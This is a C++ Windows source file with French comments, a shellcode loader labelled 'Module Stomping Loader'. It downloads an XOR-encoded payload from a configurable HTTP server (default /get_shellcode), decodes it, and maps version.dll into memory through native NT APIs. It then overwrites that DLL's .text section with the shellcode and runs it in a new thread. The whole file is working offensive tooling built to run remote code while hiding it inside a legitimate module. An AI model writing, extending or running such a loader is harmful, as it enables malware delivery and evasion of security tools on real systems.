#include <Windows.h>
#include <winternl.h>
#include <winhttp.h>
#include <iostream>
#include <iomanip>
#include <vector>
#include <string>
#include <sstream>
#include <memory>
#include <chrono>
#include <thread>

#pragma comment(lib, "winhttp.lib")

// Configuration globale
struct Config {
    static const uint8_t XOR_KEY = 0xAA;
    static constexpr const wchar_t* USER_AGENT = L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
    static constexpr const wchar_t* DEFAULT_SERVER = L"127.0.0.1";
    static constexpr INTERNET_PORT DEFAULT_PORT = 5000;
    static constexpr const wchar_t* DEFAULT_PATH = L"/get_shellcode";
    static constexpr const char* DEFAULT_DLL = "C:\\Windows\\System32\\version.dll";
    static constexpr DWORD TIMEOUT_MS = 30000;  // 30 secondes
};

// Classe utilitaire pour le logging
class Logger {
public:
    enum Level { DEBUG, INFO, WARNING, ERROR };
    static void log(Level level, const std::string& message) {
        auto now = std::chrono::system_clock::now();
        auto now_c = std::chrono::system_clock::to_time_t(now);
        std::tm tm;
        localtime_s(&tm, &now_c);

        const char* level_str[] = {"[DEBUG]", "[INFO]", "[WARN]", "[ERROR]"};
        std::cout << std::put_time(&tm, "%Y-%m-%d %H:%M:%S") 
                 << " " << level_str[level] << " " << message << std::endl;
    }

    static void hexdump(const void* data, size_t size) {
        const uint8_t* p = static_cast<const uint8_t*>(data);
        std::stringstream ss;
        ss << "\nHexdump (" << size << " bytes):\n";
        
        for (size_t i = 0; i < size; i += 16) {
            ss << std::setw(4) << std::setfill('0') << std::hex << i << ": ";
            
            // Affichage hexadécimal
            for (size_t j = 0; j < 16; j++) {
                if (i + j < size)
                    ss << std::setw(2) << std::setfill('0') << std::hex 
                       << static_cast<int>(p[i + j]) << " ";
                else
                    ss << "   ";
            }
            
            // Affichage ASCII
            ss << " | ";
            for (size_t j = 0; j < 16 && i + j < size; j++) {
                char c = static_cast<char>(p[i + j]);
                ss << (c >= 32 && c <= 126 ? c : '.');
            }
            ss << "\n";
        }
        log(DEBUG, ss.str());
    }
};

// Gestionnaire d'erreurs Windows
class WindowsErrorHandler {
public:
    static void logLastError(const char* context) {
        DWORD error = GetLastError();
        char* messageBuffer = nullptr;
        
        FormatMessageA(
            FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
            nullptr, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
            reinterpret_cast<LPSTR>(&messageBuffer), 0, nullptr
        );

        std::stringstream ss;
        ss << "Erreur dans " << context << ": (0x" << std::hex << error << ") " 
           << (messageBuffer ? messageBuffer : "Message d'erreur inconnu");
        Logger::log(Logger::ERROR, ss.str());

        if (messageBuffer)
            LocalFree(messageBuffer);
    }
};

// Classe pour la gestion des ressources Windows (RAII)
template<typename T>
class WindowsHandle {
    T handle;
    std::function<void(T)> deleter;

public:
    WindowsHandle(T h, std::function<void(T)> d) : handle(h), deleter(d) {}
    ~WindowsHandle() { if (isValid()) deleter(handle); }
    
    bool isValid() const { 
        return handle != nullptr && handle != INVALID_HANDLE_VALUE; 
    }
    
    T get() const { return handle; }
    T* address() { return &handle; }
    
    WindowsHandle(const WindowsHandle&) = delete;
    WindowsHandle& operator=(const WindowsHandle&) = delete;
};

// Classe pour la récupération du shellcode
class ShellcodeFetcher {
public:
    static bool fetch(const std::wstring& server, INTERNET_PORT port, 
                     const std::wstring& path, std::vector<uint8_t>& data) {
        Logger::log(Logger::INFO, "Initialisation de la connexion HTTP...");
        
        WindowsHandle session(
            WinHttpOpen(Config::USER_AGENT, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                       WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0),
            WinHttpCloseHandle
        );
        
        if (!session.isValid()) {
            WindowsErrorHandler::logLastError("WinHttpOpen");
            return false;
        }

        // Configuration du timeout
        WinHttpSetTimeouts(session.get(), 0, Config::TIMEOUT_MS, 
                          Config::TIMEOUT_MS, Config::TIMEOUT_MS);

        WindowsHandle connection(
            WinHttpConnect(session.get(), server.c_str(), port, 0),
            WinHttpCloseHandle
        );
        
        if (!connection.isValid()) {
            WindowsErrorHandler::logLastError("WinHttpConnect");
            return false;
        }

        WindowsHandle request(
            WinHttpOpenRequest(connection.get(), L"GET", path.c_str(), 
                             nullptr, WINHTTP_NO_REFERER, 
                             WINHTTP_DEFAULT_ACCEPT_TYPES, 0),
            WinHttpCloseHandle
        );
        
        if (!request.isValid()) {
            WindowsErrorHandler::logLastError("WinHttpOpenRequest");
            return false;
        }

        if (!WinHttpSendRequest(request.get(), WINHTTP_NO_ADDITIONAL_HEADERS, 
                               0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) ||
            !WinHttpReceiveResponse(request.get(), nullptr)) {
            WindowsErrorHandler::logLastError("WinHttpSendRequest/ReceiveResponse");
            return false;
        }

        DWORD statusCode = 0;
        DWORD statusCodeSize = sizeof(statusCode);
        WinHttpQueryHeaders(request.get(), 
                          WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                          nullptr, &statusCode, &statusCodeSize, nullptr);

        if (statusCode != 200) {
            Logger::log(Logger::ERROR, "Erreur HTTP: " + std::to_string(statusCode));
            return false;
        }

        data.clear();
        DWORD bytesAvailable;
        while (WinHttpQueryDataAvailable(request.get(), &bytesAvailable) && 
               bytesAvailable > 0) {
            std::vector<uint8_t> buffer(bytesAvailable);
            DWORD bytesRead;
            
            if (WinHttpReadData(request.get(), buffer.data(), 
                               bytesAvailable, &bytesRead)) {
                data.insert(data.end(), buffer.begin(), buffer.begin() + bytesRead);
            } else {
                WindowsErrorHandler::logLastError("WinHttpReadData");
                return false;
            }
        }

        Logger::log(Logger::INFO, "Données reçues: " + std::to_string(data.size()) + " octets");
        Logger::hexdump(data.data(), std::min(size_t(32), data.size()));
        return true;
    }
};

// Classe pour le déchiffrement du shellcode
class ShellcodeDecryptor {
public:
    static bool decrypt(const std::vector<uint8_t>& input, 
                       std::vector<uint8_t>& output) {
        Logger::log(Logger::INFO, "Déchiffrement du shellcode...");
        output.resize(input.size());
        
        for (size_t i = 0; i < input.size(); ++i) {
            output[i] = input[i] ^ Config::XOR_KEY;
        }
        
        Logger::log(Logger::INFO, "Shellcode déchiffré:");
        Logger::hexdump(output.data(), std::min(size_t(32), output.size()));
        return true;
    }
};

// Classe pour l'injection de code
class ModuleStomper {
private:
    struct NtApiFunctions {
        using NtCreateSectionFunc = NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, 
            POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
        using NtMapViewOfSectionFunc = NTSTATUS(NTAPI*)(HANDLE, HANDLE, PVOID*, 
            ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
        using NtProtectVirtualMemoryFunc = NTSTATUS(NTAPI*)(HANDLE, PVOID*, 
            PSIZE_T, ULONG, PULONG);

        NtCreateSectionFunc NtCreateSection;
        NtMapViewOfSectionFunc NtMapViewOfSection;
        NtProtectVirtualMemoryFunc NtProtectVirtualMemory;

        NtApiFunctions() {
            HMODULE ntdll = GetModuleHandleA("ntdll.dll");
            NtCreateSection = reinterpret_cast<NtCreateSectionFunc>(
                GetProcAddress(ntdll, "NtCreateSection"));
            NtMapViewOfSection = reinterpret_cast<NtMapViewOfSectionFunc>(
                GetProcAddress(ntdll, "NtMapViewOfSection"));
            NtProtectVirtualMemory = reinterpret_cast<NtProtectVirtualMemoryFunc>(
                GetProcAddress(ntdll, "NtProtectVirtualMemory"));
        }
    };

public:
    static bool execute(const std::string& libraryPath, 
                       const std::vector<uint8_t>& shellcode) {
        Logger::log(Logger::INFO, "Début de l'injection...");
        NtApiFunctions ntApi;

        // Ouverture de la DLL
        WindowsHandle hFile(
            CreateFileW(std::wstring(libraryPath.begin(), libraryPath.end()).c_str(),
                       GENERIC_READ, FILE_SHARE_READ, nullptr, 
                       OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr),
            CloseHandle
        );
        
        if (!hFile.isValid()) {
            WindowsErrorHandler::logLastError("CreateFileW");
            return false;
        }

        // Création de la section
        LARGE_INTEGER maxSize{};
        maxSize.QuadPart = GetFileSize(hFile.get(), nullptr);
        WindowsHandle hSection(nullptr, CloseHandle);
        
        NTSTATUS status = ntApi.NtCreateSection(
            hSection.address(),
            SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE,
            nullptr, &maxSize, PAGE_READONLY, SEC_IMAGE, hFile.get()
        );
        
        if (status != 0) {
            Logger::log(Logger::ERROR, "NtCreateSection a échoué: 0x" + 
                       std::to_string(status));
            return false;
        }

        // Mapping de la section
        PVOID baseAddress = nullptr;
        SIZE_T viewSize = static_cast<SIZE_T>(maxSize.QuadPart);
        
        status = ntApi.NtMapViewOfSection(
            hSection.get(), GetCurrentProcess(), &baseAddress,
            0, 0, nullptr, &viewSize, ViewUnmap, 0, PAGE_READWRITE
        );
        
        if (status != 0) {
            Logger::log(Logger::ERROR, "NtMapViewOfSection a échoué: 0x" + 
                       std::to_string(status));
            return false;
        }

        // Analyse des en-têtes PE
        auto dosHeader = static_cast<PIMAGE_DOS_HEADER>(baseAddress);
        auto ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(
            static_cast<PBYTE>(baseAddress) + dosHeader->e_lfanew
        );
        
        Logger::log(Logger::INFO, "Signatures PE:");
        Logger::log(Logger::INFO, "  DOS: 0x" + 
                   std::to_string(dosHeader->e_magic));
        Logger::log(Logger::INFO, "  NT: 0x" + 
                   std::to_string(ntHeaders->Signature));

        // Recherche de la section .text
        auto sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
        PVOID textSectionAddress = nullptr;
        SIZE_T textSize = 0;

        for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
            std::string sectionName(reinterpret_cast<char*>(sectionHeader->Name), 8);
            Logger::log(Logger::INFO, "Section trouvée: " + sectionName);
            
            if (sectionName.find(".text") == 0) {
                textSectionAddress = static_cast<PBYTE>(baseAddress) + 
                                   sectionHeader->VirtualAddress;
                textSize = sectionHeader->Misc.VirtualSize;
                break;
            }
            sectionHeader++;
        }

        if (!textSectionAddress || textSize < shellcode.size()) {
            Logger::log(Logger::ERROR, "Section .text invalide ou trop petite");
            return false;
        }

        // Modification des permissions et injection
        ULONG oldProtect;
        SIZE_T shellcodeSize = shellcode.size();
        
        status = ntApi.NtProtectVirtualMemory(
            GetCurrentProcess(), &textSectionAddress,
            &shellcodeSize, PAGE_READWRITE, &oldProtect
        );
        
        if (status != 0) {
            Logger::log(Logger::ERROR, "Erreur changement permissions: 0x" + 
                       std::to_string(status));
            return false;
        }

        Logger::log(Logger::INFO, "Injection du shellcode...");
        memcpy(textSectionAddress, shellcode.data(), shellcode.size());
        Logger::hexdump(textSectionAddress, std::min(size_t(32), shellcode.size()));

        // Restauration des permissions
        status = ntApi.NtProtectVirtualMemory(
            GetCurrentProcess(), &textSectionAddress,
            &shellcodeSize, PAGE_EXECUTE_READ, &oldProtect
        );
        
        if (status != 0) {
            Logger::log(Logger::ERROR, "Erreur restauration permissions: 0x" + 
                       std::to_string(status));
            return false;
        }

        // Exécution du shellcode
        Logger::log(Logger::INFO, "Création du thread d'exécution...");
        WindowsHandle hThread(
            CreateThread(nullptr, 0,
                        reinterpret_cast<LPTHREAD_START_ROUTINE>(textSectionAddress),
                        nullptr, 0, nullptr),
            CloseHandle
        );
        
        if (!hThread.isValid()) {
            WindowsErrorHandler::logLastError("CreateThread");
            return false;
        }

        // Attente de la fin d'exécution
        Logger::log(Logger::INFO, "Attente de la fin du thread...");
        if (WaitForSingleObject(hThread.get(), INFINITE) != WAIT_OBJECT_0) {
            WindowsErrorHandler::logLastError("WaitForSingleObject");
            return false;
        }

        DWORD exitCode;
        if (GetExitCodeThread(hThread.get(), &exitCode)) {
            Logger::log(Logger::INFO, "Thread terminé avec le code: 0x" + 
                       std::to_string(exitCode));
        }

        Logger::log(Logger::INFO, "Injection terminée avec succès");
        return true;
    }
};

// Point d'entrée principal
int main(int argc, char* argv[]) {
    try {
        std::cout << "\n=== Module Stomping Loader - Version améliorée ===\n" << std::endl;

        // Configuration initiale
        std::string libraryPath = Config::DEFAULT_DLL;
        std::wstring server = Config::DEFAULT_SERVER;
        std::wstring path = Config::DEFAULT_PATH;
        INTERNET_PORT port = Config::DEFAULT_PORT;

        // Traitement des arguments en ligne de commande
        for (int i = 1; i < argc; i++) {
            std::string arg = argv[i];
            if (arg == "-dll" && i + 1 < argc) libraryPath = argv[++i];
            else if (arg == "-server" && i + 1 < argc) {
                std::string srv = argv[++i];
                server = std::wstring(srv.begin(), srv.end());
            }
            else if (arg == "-port" && i + 1 < argc) port = std::stoi(argv[++i]);
            else if (arg == "-path" && i + 1 < argc) {
                std::string p = argv[++i];
                path = std::wstring(p.begin(), p.end());
            }
            else if (arg == "-h" || arg == "--help") {
                std::cout << "Usage: " << argv[0] << " [options]\n"
                         << "Options:\n"
                         << "  -dll <path>     Chemin de la DLL (défaut: " << Config::DEFAULT_DLL << ")\n"
                         << "  -server <host>  Serveur (défaut: 127.0.0.1)\n"
                         << "  -port <port>    Port (défaut: 5000)\n"
                         << "  -path <path>    Chemin (défaut: /get_shellcode)\n"
                         << "  -h, --help      Affiche cette aide\n";
                return 0;
            }
        }

        // Affichage de la configuration
        Logger::log(Logger::INFO, "Configuration:");
        Logger::log(Logger::INFO, "  DLL: " + libraryPath);
        Logger::log(Logger::INFO, "  Serveur: " + std::string(server.begin(), server.end()));
        Logger::log(Logger::INFO, "  Port: " + std::to_string(port));

        // Récupération du shellcode
        std::vector<uint8_t> encryptedShellcode;
        if (!ShellcodeFetcher::fetch(server, port, path, encryptedShellcode)) {
            Logger::log(Logger::ERROR, "Échec de la récupération du shellcode");
            return 1;
        }

        // Déchiffrement
        std::vector<uint8_t> shellcode;
        if (!ShellcodeDecryptor::decrypt(encryptedShellcode, shellcode)) {
            Logger::log(Logger::ERROR, "Échec du déchiffrement");
            return 1;
        }

        // Injection et exécution
        if (!ModuleStomper::execute(libraryPath, shellcode)) {
            Logger::log(Logger::ERROR, "Échec de l'injection");
            return 1;
        }

        Logger::log(Logger::INFO, "Opération terminée avec succès");
        return 0;
    }
    catch (const std::exception& e) {
        Logger::log(Logger::ERROR, "Exception: " + std::string(e.what()));
        return 1;
    }
    catch (...) {
        Logger::log(Logger::ERROR, "Exception inconnue");
        return 1;
    }
}